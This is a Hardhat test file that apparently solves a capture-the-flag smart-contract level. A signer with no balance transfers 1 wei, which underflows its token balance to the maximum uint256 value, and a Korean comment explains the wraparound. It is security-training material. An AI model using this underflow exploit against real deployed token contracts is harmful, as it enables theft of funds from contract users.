const { loadFixture, } = require("@nomicfoundation/hardhat-toolbox/network-helpers");
const { ethers } = require("hardhat");
const { expect } = require("chai");
  
describe("Level05 - Token", function () {
    async function setUp() {
        const [owner, hacker, Alice] = await ethers.getSigners();

        const TokenContract = await ethers.deployContract("Token", [ethers.parseEther("20")]);
        const TokenAddress = await TokenContract.getAddress();

        return {owner, hacker, Alice, TokenContract, TokenAddress};
    };

    describe("Level05 hacking", () => {
        it("should cause an underflow and set the hacker’s balance to the maximum uint256 value", async() => {
            const {owner, hacker, Alice, TokenContract, TokenAddress} = await loadFixture(setUp);
            
            // console.log("balanceOf hacker: ", ethers.formatUnits(await TokenContract.connect(hacker).balanceOf(hacker.address), "wei"));

            await TokenContract.connect(hacker).transfer(Alice.address, ethers.parseUnits("1", "wei"));
            // console.log("balanceOf hacker: ", ethers.formatUnits(await TokenContract.connect(hacker).balanceOf(hacker.address), "wei"));
            expect(BigInt(await TokenContract.connect(hacker).balanceOf(hacker.address))).to.equal(ethers.MaxUint256)
            // 0에서 1을 뺐기 최대값인 때문에 2^256 - 1이 된다.
        }); 

    })

});